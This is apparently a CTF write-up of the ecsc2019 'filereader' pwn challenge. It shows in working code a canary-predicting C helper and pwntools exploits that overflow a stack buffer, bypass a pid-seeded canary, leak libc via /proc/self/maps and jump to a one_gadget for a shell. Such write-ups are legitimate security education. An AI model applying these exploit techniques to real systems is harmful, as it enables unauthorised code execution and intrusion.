---
title: "Filereader"
date: 2019-05-21T19:11:39+02:00
categories:
- write-ups
- ecsc2019
tags:
- pwn
- reverse
keywords:
- pwn
- reverse

metaAlignment: center
autoThumbnailImage: false
summary : "Write-up about the challenge Filereader from the qualification of the ecsc2019 CTF."
---

|  Event | Challenge | Category | Points | Solves |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| ecsc2019 |  filereader  |  pwn  | 1000 |  20  |

# TL;DR

We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to */proc/self/map* since we can read files. A onegadget is then used to pop a shell.

# Recon

First we check the protections, NX and PIE are enabled which mean we won't be able neither to execute code nor use gadgets to do a ropchain.

{{< image classes="fancybox fig-100 center" src="/images/filereader/sec.png" thumbnail="/images/filereader/sec.png" >}}

The binary ask for a file which should contain a list of other files. Then it will display the content of each file if the permissions are ok. I load the binary into ghidra and spot many interesting things.

First we can spot a buffer overflow in the {{< hl-text orange >}}fscanf{{< /hl-text >}} function which doesn't check for the size of the filename. (*local_118* is a pointer to the file containing the filenames of the files to read and *auStack272* is a 260 bytes long buffer)

{{< image classes="fancybox fig-100 center" src="/images/filereader/fscanf.png" thumbnail="/images/filereader/fscanf.png" >}}

But we have to bypass some custom stack cookies, indeed the binary is not stripped and we can see the {{< hl-text orange >}}canarie{{< /hl-text >}} variable wich is push on the stack at the beginning of the execution : 

{{< image classes="fancybox fig-100 center" src="/images/filereader/canarie1.png" thumbnail="/images/filereader/canarie1.png" >}}

And then checked at the end.

{{< image classes="fancybox fig-100 center" src="/images/filereader/canarie2.png" thumbnail="/images/filereader/canarie2.png" >}}

It's not secure at all since the {{< hl-text orange >}}pid{{< /hl-text >}} can be predicted and so the canarie can be forged to bypass the protection.

# Exploit part1

We now have everything to start writing our exploit, I like python for pwn challenge, but the random implementation of python is different from the one used in C so I wrote a really simple program which return a random number depending of the input like in the binary.

{{< codeblock "rand.c" "C" >}}
#include <stdio.h>

int main(int argc, char **argv)
{
  int pid = atoi(argv[1]);
  int canarie = 0;
  srand(pid);
  canarie = rand();
  printf("%d\n", canarie);
}

{{< /codeblock >}}

Let start writing some python and see :

{{< codeblock "exploit.py" "python" >}}
from pwn import *
import os

FILE = "/tmp/file"

pid = os.getpid()
log.info("pid : "+str(pid))

#Return the canarie from the predicted pid
p = process(['./rand', str(pid+5)])
canarie = p.recvline().strip()
p.close()

log.info("canarie : "+str(canarie))

#size of the buffer containing the filename
offset = 260

payload = ""
payload += "A" * offset
payload += p64(int(canarie))
payload += p32(0x0)             #ebp
payload += p64(0xdeadbeef)      #return address

f = open(FILE, 'w')
f.write(payload)
f.close()

r = process(['./filereader', '/tmp/file'])
print r.recvall()
{{< /codeblock >}}

I found that the filereader binary would be launched with a pid increased by 5 from the python script. Then run it... and we don't have the message saying *Stack smashing detected!* anymore, instead we have a {{< hl-text orange >}}segfault{{< /hl-text >}} due to {{< hl-text orange >}}0xdeadbeef{{< /hl-text >}} address.

{{< image classes="fancybox fig-100 center" src="/images/filereader/test1.png" thumbnail="/images/filereader/test1.png" >}}


# Exploit part2

Ok, but now what ? Where should we jump since we control {{< hl-text orange >}}rip{{< /hl-text >}} ? As I said at the beginning no ropchain and no shellcode because of PIE and NX protections. We need to leak an address from the libc and then found a [onegadget](https://github.com/david942j/one_gadget) to get our shell. This is the tricky part and I stayed stuck here for some days. But wait we have a binary which read files, so we can read {{< hl-text orange >}}/proc/self/maps{{< /hl-text >}} which contain the address of the code, the stack, the heap and the libc !

My idea was to create a file like this : 

{{< codeblock "/tmp/file" "bash" >}}
/proc/self/maps
/tmp/a
/tmp/a
/tmp/a
/tmp/a
[...]
/tmp/a
/tmp/a
/tmp/a
PAAAAAAAAAAAAAAYLOAD
{{< /codeblock >}}

If there is enought */tmp/a* the process will be too busy to read them and we will be able to write our payload from the first part at the end of this file. 

Before we need the address of a onegadget.

{{< image classes="fancybox fig-100 center" src="/images/filereader/onegadget.png" thumbnail="/images/filereader/onegadget.png" >}}

Here is the final exploit :

{{< codeblock "exploit.py" "python" >}}
from pwn import *
import os

FILE = "/tmp/file"
TMP_FILE = "/tmp/a"
MAX = 500

#parse the ouptut of /proc/self/maps
#and return the address of libc
def getAddress(r, line):
    lines = r.split('\n')
    return lines[line].split('-')[0]

pid = os.getpid()
log.info("pid : "+str(pid))

p = process(['./rand', str(pid+5)])
canarie = p.recvline().strip()
p.close()
log.info("canarie : "+str(canarie))

offset = 260

#Write some content to /tmp/a
f = open(TMP_FILE, 'w')
f.write('gonna pwn you')
f.close()

f = open(FILE, 'w')
f.write("/proc/self/maps\n")

#fill the file with /tmp/a
for i in range(0,MAX):
    f.write(TMP_FILE+'\n')

f.close()


r = process(['./filereader', '/tmp/file'])
r.recvline()

maps = r.recvuntil('Attempting to read file')
libc_base = getAddress(maps, 4)

execve = 0x3f306
jump = execve + int(libc_base,16)

payload = ""
payload += "A" * offset
payload += p64(int(canarie))
payload += p32(0x0)
payload += p64(jump)

#a option for append
f = open(FILE, 'a')
f.write(payload)
f.close()

print r.recvline()

#BOOM shell
r.interactive()

{{< /codeblock >}}

# Flag

{{< image classes="fancybox fig-100 center" src="/images/filereader/flag.png" thumbnail="/images/filereader/flag.png" >}}



